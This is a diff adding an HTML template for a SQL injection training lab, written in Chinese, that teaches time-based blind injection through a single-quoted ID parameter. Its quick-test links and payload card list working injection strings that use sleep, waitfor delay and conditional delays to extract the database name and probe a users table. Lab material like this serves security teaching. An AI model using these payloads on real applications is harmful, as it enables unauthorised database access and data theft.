@@ -1,0 +1,124 @@
+{% extends "base.html" %}
+
+{% block title %}Less-9: GET - Blind - Time based - Single Quotes{% endblock %}
+
+{% block content %}
+<div class="container mt-4">
+    <div class="row">
+        <div class="col-lg-8">
+            <div class="card lab-card">
+                <div class="card-header">
+                    <h2><i class="fas fa-clock"></i> Less-9: GET - 时间盲注 - 单引号</h2>
+                    <span class="badge badge-danger">时间盲注</span>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-info">
+                        <strong>学习目标：</strong> 理解时间盲注的工作原理，学会通过响应时间差异来判断SQL查询结果
+                    </div>
+
+                    <form method="GET" class="mb-4">
+                        <div class="form-group">
+                            <label for="id">输入ID参数：</label>
+                            <input type="text" class="form-control" name="id" id="id" 
+                                   value="{{ id_param }}" placeholder="例如: 1">
+                        </div>
+                        <button type="submit" class="btn btn-primary">
+                            <i class="fas fa-search"></i> 测试注入
+                        </button>
+                    </form>
+
+                    {% if id_param %}
+                    <div class="result-section">
+                        <h5>测试结果：</h5>
+                        <div class="alert alert-info">
+                            <strong>响应时间：</strong> {{ response_time }}秒<br>
+                            <strong>状态：</strong> {{ message }}
+                        </div>
+                    </div>
+                    {% endif %}
+
+                    <div class="quick-tests mt-4">
+                        <h5>快速测试：</h5>
+                        <div class="btn-group-vertical w-100" role="group">
+                            <a href="?id=1" class="btn btn-outline-primary">正常查询: id=1</a>
+                            <a href="?id=1'" class="btn btn-outline-warning">语法错误: id=1'</a>
+                            <a href="?id=1' and sleep(3)--+" class="btn btn-outline-danger">时间延迟: id=1' and sleep(3)--+</a>
+                            <a href="?id=1' and if(1=1,sleep(3),0)--+" class="btn btn-outline-success">条件延迟(真): id=1' and if(1=1,sleep(3),0)--+</a>
+                            <a href="?id=1' and if(1=2,sleep(3),0)--+" class="btn btn-outline-info">条件延迟(假): id=1' and if(1=2,sleep(3),0)--+</a>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-warning mt-4">
+                        <strong><i class="fas fa-exclamation-triangle"></i> 注意：</strong>
+                        时间盲注测试可能需要等待几秒钟才能看到结果，请耐心等待。
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-4">
+            <div class="card info-card">
+                <div class="card-header">
+                    <h5><i class="fas fa-lightbulb"></i> 漏洞分析</h5>
+                </div>
+                <div class="card-body">
+                    <h6>漏洞类型：</h6>
+                    <p>时间盲注（Time-based Blind SQL Injection）</p>
+                    
+                    <h6>特点：</h6>
+                    <ul>
+                        <li>无任何显示输出</li>
+                        <li>通过响应时间判断</li>
+                        <li>使用延迟函数</li>
+                        <li>最隐蔽的注入方式</li>
+                    </ul>
+
+                    <h6>测试方法：</h6>
+                    <ol>
+                        <li>测试延迟函数</li>
+                        <li>构造条件延迟</li>
+                        <li>观察响应时间</li>
+                        <li>逐字符猜测</li>
+                    </ol>
+                </div>
+            </div>
+
+            <div class="card payload-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-code"></i> 常用载荷</h5>
+                </div>
+                <div class="card-body">
+                    <h6>基础延迟：</h6>
+                    <code>1' and sleep(5)--+</code><br>
+                    <code>1'; waitfor delay '00:00:05'--</code><br><br>
+                    
+                    <h6>条件延迟：</h6>
+                    <code>1' and if(1=1,sleep(5),0)--+</code><br>
+                    <code>1' and if(length(database())>5,sleep(5),0)--+</code><br><br>
+                    
+                    <h6>数据提取：</h6>
+                    <code>1' and if(ascii(substr(database(),1,1))>97,sleep(5),0)--+</code><br>
+                    <code>1' and if((select count(*) from users)>0,sleep(5),0)--+</code>
+                </div>
+            </div>
+
+            <div class="card tips-card mt-3">
+                <div class="card-header">
+                    <h5><i class="fas fa-tools"></i> 工具推荐</h5>
+                </div>
+                <div class="card-body">
+                    <ul>
+                        <li><strong>SQLMap:</strong> 自动化时间盲注</li>
+                        <li><strong>Burp Suite:</strong> 手工测试</li>
+                        <li><strong>自定义脚本:</strong> 批量测试</li>
+                    </ul>
+                    
+                    <div class="alert alert-info mt-2">
+                        <small><strong>提示：</strong> 时间盲注通常是最后的选择，当其他注入方式都无效时使用。</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %} 
